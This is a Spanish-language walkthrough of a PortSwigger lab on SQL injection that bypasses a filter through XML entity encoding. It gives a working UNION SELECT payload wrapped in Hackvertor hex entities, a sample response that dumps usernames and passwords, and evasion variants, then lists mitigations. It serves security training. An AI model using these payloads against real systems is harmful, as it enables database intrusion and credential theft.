
---
# Guía práctica: Bypass de filtros con codificación XML en Inyección SQL

---

## Laboratorio PortSwigger

Para ilustrar con ejemplos reales usaremos el laboratorio gratuito de [PortSwigger](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding):

`https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding`

Todas las pruebas que se muestran a continuación se realizaron contra la URL provista por ese laboratorio.

---

## Confirmación de la vulnerabilidad

**Resumen:** en este laboratorio la entrada vulnerable es el `stock check`. Para confirmarlo interceptamos peticiones con Burp Suite y observamos el valor de la estructura `xml`.

**Paso práctico (comprobación rápida):**

1. Localiza la cabecera `stock check`.
    
2. Intercepta una petición con Burp (o abre DevTools).
    
3. Modifica temporalmente el valor añadiendo una comilla simple (`'`) al final:  
    `<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1'</productId><storeId>1</storeId></stockCheck>`
    

---

## Explotación

**Nota:** usamos la extensión de Burp Suite llamada `Hackvertor` para generar y estructurar entidades XML que el parser reconstituya como texto SQL válido.

**Payload de ejemplo:**

```html
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId><@hex_entities>1 union select username||':'||password from users</@hex_entities></storeId>
</stockCheck>
```

**Respuesta esperada (ejemplo):**

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 100

administrator:y6f9k4etn394ty88x9ms
621 units
wiener:rxb51mrgk558d9tr2q17
carlos:q7ggvm46uv50c4mln69g
```

---

## Por qué funciona (resumen técnico)

- El parser XML expande entidades/encodings que el filtro no detecta como maliciosas.

- Tras la expansión, la cadena resultante contiene `UNION SELECT ...` que el backend concatena en la consulta SQL.

- `username||':'||password` es una concatenación válida en ciertos SGBD (p. ej. PostgreSQL); en otros SGBD habrá que adaptar la concatenación.


---

## Variantes y adaptaciones rápidas

- Codificar `UNION`/`SELECT` como entidades hex (`&#x55;&#x4E;&#x49;&#x4F;&#x4E;`) para evadir filtros.

- Ajustar la concatenación según el SGBD (Postgres: `||`, MySQL: `CONCAT(...)`, MSSQL: `+`).

- Usar subconsultas con `WHERE username='administrator'` y `LIMIT 1` para evitar ambigüedades por múltiples filas.


---

## Mitigaciones recomendadas (breve)

1. Desactivar la expansión automática de entidades XML si no es necesaria.

2. Validar y normalizar los datos tras el parseo y antes de su uso en SQL.

3. Usar consultas parametrizadas / prepared statements.

4. Aplicar whitelists y validar tipos/longitudes en los campos XML.

5. Monitorizar y alertar ante entidades XML inusuales.


---

